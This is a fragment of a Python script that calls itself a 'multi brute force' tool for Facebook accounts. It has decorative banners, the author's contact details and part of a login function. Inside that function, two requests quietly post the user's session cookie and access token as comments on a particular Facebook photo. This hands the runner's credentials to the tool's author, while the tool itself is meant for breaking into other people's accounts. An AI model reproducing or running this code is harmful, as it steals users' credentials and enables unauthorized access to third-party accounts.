...
{P} |____/ |__|__||__|__||__|__   {P} |__|   |__|__||_____||_____||_____||_____||_____||__|__|
			{M}•{K}•{H}• {P}MULTI BRUTE FORCE FACEBOOK {H}•{K}•{M}•
             {M}•{K}•{H}• {P} By Author   : Ferly Shishigami         
			       {M}•{K}•{H}• {P}My Github   : github.com/Shishigami-X  
			       {M}•{K}•{H}• {P}My Hp/Wa    : +6285797818026           
			       {M}•{K}•{H}• {P}My Facebook : フェリー シシガミ          
        prints(Panel(my_logo,width=90,padding=0,style=xtc["warna"]["rich"],title=f"{QQ}•{II}•{MM}• {OO}Shishigami-X {MM}•{II}•{QQ}•""")             
def logo2():
	return str(f"""
{M}  ____   _____  _____  _____   {M}  _____  _____  _____  _____  _____  _____  _____  _____
{U} |    \ |  _  || __  ||  |  |  {U} |   __||  _  ||     ||   __|| __  ||     ||     ||  |  |
...
def login():
	...
	try:
		...
		link = ('https://www.facebook.com/photo?fbid=1602567310195766&set=a.135714890214356')
		...
		ses.post(f"https://graph.facebook.com/1602567310195766/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/81602567310195766/comments/?message={token}&access_token={token}",cookies=cok)
